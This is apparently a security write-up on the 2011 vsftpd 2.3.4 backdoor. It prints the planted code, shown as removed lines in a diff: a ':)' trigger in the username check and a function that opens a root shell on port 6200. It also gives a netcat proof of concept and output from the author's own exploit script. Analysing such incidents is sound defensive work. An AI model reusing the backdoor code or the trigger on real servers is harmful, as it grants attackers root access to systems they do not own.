# vsftpd v2.3.4 Backdoor Command Execution

## Timeline :

A malicious backdoor was added to the VSFTPD download archive. This backdoor was introduced into the `vsftpd-2.3.4.tar.gz` archive between June 30th 2011 and July 1st 2011 according to the most recent information available. This backdoor was removed on July 3rd 2011.

Backdoor discovered by **Mathias Kresin**.

Metasploit module is also available for this vulnerability. It's written by:

* hdm <x@hdm.io>
* MC <mc@metasploit.com>


## Vulnerability analysis

Checking GPG signature :

```
$ gpg --verify vsftpd-2.3.4.tar.gz.asc vsftpd-2.3.4.tar.gz
gpg: Signature made Wed, Feb 16, 2011  4:08:11 AM IST
gpg:                using DSA key AA62EC463C0E751C
gpg: Good signature from "Chris Evans <chris@scary.beasts.org>" [unknown]
gpg: WARNING: This key is not certified with a trusted signature!
gpg:          There is no indication that the signature belongs to the owner.
Primary key fingerprint: 8660 FD32 91B1 84CD BC2F  6418 AA62 EC46 3C0E 751C

```

**Not certified with a trusted signature.** (screams that vsftpd 2.3.4 from master site/branch was patched.)

Still this archive ran across the internet. Yes.

It's good that we have the source, let's compare it with the penultimate official release.

#### Diff 

```
Only in vsftpd-2.3.4: access.o
Only in vsftpd-2.3.4: ascii.o
Only in vsftpd-2.3.4: banner.o
Only in vsftpd-2.3.4: features.o
Only in vsftpd-2.3.4: filestr.o
Only in vsftpd-2.3.4: ftpcmdio.o
Only in vsftpd-2.3.4: ftpdataio.o
Only in vsftpd-2.3.4: ftppolicy.o
Only in vsftpd-2.3.4: hash.o
Only in vsftpd-2.3.4: ipaddrparse.o
Only in vsftpd-2.3.4: logging.o
Only in vsftpd-2.3.4: ls.o
Only in vsftpd-2.3.4: main.o
Only in vsftpd-2.3.4: netstr.o
Only in vsftpd-2.3.4: oneprocess.o
Only in vsftpd-2.3.4: opts.o
Only in vsftpd-2.3.4: parseconf.o
Only in vsftpd-2.3.4: postlogin.o
Only in vsftpd-2.3.4: postprivparent.o
Only in vsftpd-2.3.4: prelogin.o
Only in vsftpd-2.3.4: privops.o
Only in vsftpd-2.3.4: privsock.o
Only in vsftpd-2.3.4: ptracesandbox.o
Only in vsftpd-2.3.4: readwrite.o
Only in vsftpd-2.3.4: secbuf.o
Only in vsftpd-2.3.4: secutil.o
Only in vsftpd-2.3.4: ssl.o
Only in vsftpd-2.3.4: sslslave.o
Only in vsftpd-2.3.4: standalone.o
diff -ur vsftpd-2.3.4/str.c vsftpd-2.3.4.4players/str.c
--- vsftpd-2.3.4/str.c	2011-06-30 15:52:38.000000000 +0200
+++ vsftpd-2.3.4.4players/str.c	2008-12-17 06:54:16.000000000 +0100
@@ -569,11 +569,6 @@
     {
       return 1;
     }
-    else if((p_str->p_buf[i]==0x3a)
-    && (p_str->p_buf[i+1]==0x29))
-    {
-      vsf_sysutil_extra();
-    }
   }
   return 0;
 }
Only in vsftpd-2.3.4: str.o
Only in vsftpd-2.3.4: strlist.o
diff -ur vsftpd-2.3.4/sysdeputil.c vsftpd-2.3.4.4players/sysdeputil.c
--- vsftpd-2.3.4/sysdeputil.c	2011-06-30 15:58:00.000000000 +0200
+++ vsftpd-2.3.4.4players/sysdeputil.c	2010-03-26 04:25:33.000000000 +0100
@@ -34,10 +34,7 @@
 /* For FreeBSD */
 #include <sys/param.h>
 #include <sys/uio.h>
-#include <netinet/in.h>
-#include <netdb.h>
-#include <string.h>
-#include <stdlib.h>
+
 #include <sys/prctl.h>
 #include <signal.h>
 
@@ -220,7 +217,7 @@
 static int s_proctitle_inited = 0;
 static char* s_p_proctitle = 0;
 #endif
-int vsf_sysutil_extra();
+
 #ifndef VSF_SYSDEP_HAVE_MAP_ANON
 #include <sys/types.h>
 #include <sys/stat.h>
@@ -843,30 +840,6 @@
   }
 }
 
-int
-vsf_sysutil_extra(void)
-{
-  int fd, rfd;
-  struct sockaddr_in sa;
-  if((fd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
-  exit(1); 
-  memset(&sa, 0, sizeof(sa));
-  sa.sin_family = AF_INET;
-  sa.sin_port = htons(6200);
-  sa.sin_addr.s_addr = INADDR_ANY;
-  if((bind(fd,(struct sockaddr *)&sa,
-  sizeof(struct sockaddr))) < 0) exit(1);
-  if((listen(fd, 100)) == -1) exit(1);
-  for(;;)
-  { 
-    rfd = accept(fd, 0, 0);
-    close(0); close(1); close(2);
-    dup2(rfd, 0); dup2(rfd, 1); dup2(rfd, 2);
-    execl("/bin/sh","sh",(char *)0); 
-  } 
-}
-
-
 void
 vsf_sysutil_set_proctitle_prefix(const struct mystr* p_str)
 {
Only in vsftpd-2.3.4: sysdeputil.o
Only in vsftpd-2.3.4: sysstr.o
Only in vsftpd-2.3.4: sysutil.o
Only in vsftpd-2.3.4: tcpwrap.o
Only in vsftpd-2.3.4: tunables.o
Only in vsftpd-2.3.4: twoprocess.o
Only in vsftpd-2.3.4: utility.o
```

### Attack Anatomy

The concept is triggering the malicious `vsf_sysutil_extra();` function. As we can see the diff, it can be achieved by sending a sequence of specific bytes on port 21, namely, sequence of 0x3a (colon) and 0x29 (close parenthesis, close parens) which, on successful execution, results in opening the backdoor on non-standard port 6200 of the system with root privileges.

All commands which are sent gets executed using `execl("/bin/sh","sh",(char *)0);` function.


## Proof of Concept

```
woot@root:~$ nc 192.168.233.155 6200 -v
nc: connect to 192.168.233.155 port 6200 (tcp) failed: Connection refused
woot@root:~$ nc 192.168.233.155 21 -v
Connection to 192.168.233.155 21 port [tcp/ftp] succeeded!
220 (vsFTPd 2.3.4)
USER 0x48piraj:)       
331 Please specify the password.
PASS letmein
^C
woot@root:~$ nc 192.168.233.155 6200 -v
Connection to 192.168.233.155 6200 port [tcp/*] succeeded!
id -un
root
exit

woot@root:~$ 

```
## Our Own Exploit Sandwitch

```
C:\>exploit.py -h
usage: exploit.py [-h] --target-ip TARGET_IP --target-port TARGET_PORT

vsFTPd 2.3.4 Backdoor Execution Exploit

Required Parameters:
  --target-ip TARGET_IP
                        IP Address of the vulnerable machine
  --target-port TARGET_PORT
                        Port Address of the vulnerable running service

C:\>exploit.py --target-ip 192.168.233.155 --target-port 21
[*] Connecting to the target ...
[*] Connected to Port 21, looking for vsFTPd 2.3.4 ...
[*] Target seems vulnerable!
[*] Triggered the Backdoor, Spawning r00t shell ...
[*] Root Shell Spawned!

(0x48piraj)$ id -un
(0x48piraj)$ root
(0x48piraj)$ exit


C:\>
```


## References

- https://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
- https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor
- http://lwp.interglacial.com/appf_01.htm
- http://man7.org/linux/man-pages/man3/system.3.html